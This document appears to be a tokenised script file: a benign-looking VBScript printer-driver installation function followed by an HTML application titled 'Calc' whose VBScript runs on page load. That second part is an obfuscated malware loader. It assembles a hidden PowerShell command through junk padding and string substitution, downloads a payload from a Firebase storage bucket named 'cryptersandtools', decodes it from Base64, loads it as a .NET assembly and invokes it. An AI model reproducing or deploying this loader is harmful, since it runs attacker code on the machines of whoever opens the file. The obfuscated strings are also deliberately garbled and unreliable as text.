On
Error
Resume
Next
function
AddDriver
(
strServer
,
strModel
,
strFilePath
,
uVersion
,
strEnvironment
,
strInfFile
,
strUser
,
strPassword
)
on
error
resume
next
DebugPrint
kDebugTrace
,
L_Text_Dbg_Msg01_Text
dim
oDriver
dim
oService
dim
iResult
dim
uResult
'
'
Initialize
return
value
'
iResult
=
kErrorFailure
if
WmiConnect
(
strServer
,
kNameSpace
,
strUser
,
strPassword
,
oService
)
then
set
oDriver
=
oService.Get
(
``
Win32_PrinterDriver
''
)
else
AddDriver
=
kErrorFailure
exit
function
end
if
'
'
Check
if
Get
was
successful
'
if
Err.Number
=
kErrorSuccess
then
oDriver.Name
=
strModel
oDriver.SupportedPlatform
=
strEnvironment
oDriver.Version
=
uVersion
oDriver.FilePath
=
strFilePath
oDriver.InfName
=
strInfFile
uResult
=
oDriver.AddPrinterDriver
(
oDriver
)
if
Err.Number
=
kErrorSuccess
then
if
uResult
=
kErrorSuccess
then
wscript.echo
L_Text_Msg_General01_Text
&
L_Space_Text
&
oDriver.Name
iResult
=
kErrorSuccess
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Text_Error_General03_Text
&
L_Space_Text
&
uResult
end
if
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Error_Text
&
L_Space_Text
&
L_Hex_Text
&
hex
(
Err.Number
)
&
L_Space_Text
&
Err.Description
end
if
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Error_Text
&
L_Space_Text
&
L_Hex_Text
&
hex
(
Err.Number
)
&
L_Space_Text
&
Err.Description
end
if
AddDriver
=
iResult
end
function
<
html
>
<
head
>
<
title
>
Calc
<
/title
>
<
script
language=
''
VBScript
''
>
Sub
RunProgram
On
Error
Resume
Next
Set
hLpPttU
=
CreateObject
(
``
WScript.Shell
''
)
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
``
p
''
bOPehhU
=
bOPehhU
&
``
ow
''
bOPehhU
=
bOPehhU
&
``
^
(
∞�ú4
*
r
''
bOPehhU
=
bOPehhU
&
``
sh
''
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
bOPehhU
&
``
^
(
∞�ú4
*
l
''
bOPehhU
=
bOPehhU
&
``
l.^
(
∞�ú4
*
x
''
bOPehhU
=
bOPehhU
&
``
^
(
∞�ú4
*
[
By
''
bOPehhU
=
bOPehhU
&
``
t^
(
∞�ú4
*
[
``
bOPehhU
=
bOPehhU
&
``
]
]
$
rO
''
bOPehhU
=
bOPehhU
&
``
Wg
``
bOPehhU
=
bOPehhU
&
``
=
[
s
''
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
bOPehhU
&
``
yst^
(
∞�ú4
*
''
bOPehhU
=
bOPehhU
&
``
m.C☞☠∞
}
úø▲n
''
bOPehhU
=
bOPehhU
&
``
v^
(
∞�ú4
*
rt
]
:
''
bOPehhU
=
bOPehhU
&
``
:
Fr☞☠∞
}
úø▲m
''
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
bOPehhU
&
``
Bas
''
bOPehhU
=
bOPehhU
&
``
^
(
∞�ú4
*
64stri
''
bOPehhU
=
bOPehhU
&
``
ng
(
(
N^
(
∞�ú4
*
''
bOPehhU
=
bOPehhU
&
``
w-Ob
''
bOPehhU
=
bOPehhU
&
``
j^
(
∞�ú4
*
ct
N^
(
∞�ú4
*
''
bOPehhU
=
bOPehhU
&
``
t.W^
(
∞�ú4
*
bC
''
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
bOPehhU
&
``
li^
(
∞�ú4
*
nt
)
.
''
bOPehhU
=
bOPehhU
&
``
D☞☠∞
}
úø▲wn
''
bOPehhU
=
bOPehhU
&
``
l☞☠∞
}
úø▲adStri
''
bOPehhU
=
bOPehhU
&
``
ng
(
'https
:
//firebasestorage.googleapis.com/v0/b/cryptersandtools-70d26.appspot.com/o/hta.txt
?
alt=media
&
token=5374d22b-3167-4fec-bb72-b8474c01e190
'
)
)
;
''
bOPehhU
=
bOPehhU
&
``
[
Syst
''
bOPehhU
=
bOPehhU
&
``
^
(
∞�ú4
*
m.App
''
bOPehhU
=
bOPehhU
&
``
D☞☠∞
}
úø▲m
''
bOPehhU
=
bOPehhU
&
``
ai
''
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
bOPehhU
=
bOPehhU
&
``
n
]
:
:Curr^
(
∞�ú4
*
''
bOPehhU
=
bOPehhU
&
``
ntD☞☠∞
}
úø▲ma
''
bOPehhU
=
bOPehhU
&
``
in.L☞☠∞
}
úø▲ad
(
$
r
''
bOPehhU
=
bOPehhU
&
``
OWg
)
.G^
(
∞�ú4
*
tT
''
bOPehhU
=
bOPehhU
&
``
yp^
(
∞�ú4
*
(
'Fi
''
bOPehhU
=
bOPehhU
&
``
b^
(
∞�ú4
*
''
bOPehhU
=
bOPehhU
&
``
r.H☞☠∞
}
úø▲m^
(
∞�ú4
*
'
)
.
''
bOPehhU
=
bOPehhU
&
``
G^
(
∞�ú4
*
tM^
(
∞�ú4
*
tho
''
bOPehhU
=
bOPehhU
&
``
d
(
'VAI
'
)
.In
''
bOPehhU
=
bOPehhU
&
``
vok^
(
∞�ú4
*
(
$
n
''
bOPehhU
=
bOPehhU
&
``
ull
,
[
☞☠∞
}
úø▲bj^
(
∞�ú4
*
ct
[
]
''
bOPehhU
=
bOPehhU
&
``
]
(
'
4
}
�ø▶3
*
(
+ø
(
59f3
]
(
∞ú
(
94
}
�ø▶
*
(
+ø
(
8-3509-a6∞
*
▲◀
(
4-
(
úø
(
@
@
*
ú559-f53874a∞
*
▲◀
(
=n∞
*
▲◀
(
koø☀☞√�
}
П�
&
ai4
}
�ø▶∞
*
▲◀
(
m=ø☀☞√�
}
П�la
?
ø☀☞√�
}
П�◀
@
+
@
░�
@
@
ø☀☞√�
}
П�.mrow◀
@
+
@
░�
@
@
4
*
●
*
☞
#
:
▶o4
*
●
*
☞
#
:
▶mo
!
}
(
ú░
}
.ø☀☞√�
}
П�opsppa.af7
(
úø
(
@
@
*
ú4
}
�ø▶-nim4
}
�ø▶a4
*
●
*
☞
#
:
▶
*
(
+ø
(
4
*
●
*
☞
#
:
▶0v4
*
●
*
☞
#
:
▶mo
!
}
(
ú░
}
.sipa∞
*
▲◀
(
lgoog.∞
*
▲◀
(
garoø☀☞√�
}
П�s∞
*
▲◀
(
sa
*
(
+ø
(
∞
*
▲◀
(
rif4
*
●
*
☞
#
:
▶4
*
●
*
☞
#
:
▶▶☟ð
}
↓→+◀spø☀☞√�
}
П�ø☀☞√�
}
П�↓
*
(
▲☟
@
*
⇝
'
)
)
''
bOPehhU
=
Replace
(
bOPehhU
,
''
�ú�4ð
}
↓
''
,
''
p
''
)
bOPehhU
=
Replace
(
bOPehhU
,
''
☞☠∞
}
úø▲
''
,
''
o
''
)
bOPehhU
=
Replace
(
bOPehhU
,
''
^
(
∞�ú4
*
''
,
''
e
''
)
hLpPttU.Run
(
bOPehhU
)
,
false
hLpPttU.quit
xZDellv
:
BSXL
:
c
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
→
@
''
:
ISDD
:
IP
:
Self.Close
End
Sub
<
/script
>
<
/head
>
<
body
onload=
''
RunProgram
''
>
<
h1
>
PoC
<
/h1
>
<
/body
>
<
/html
>
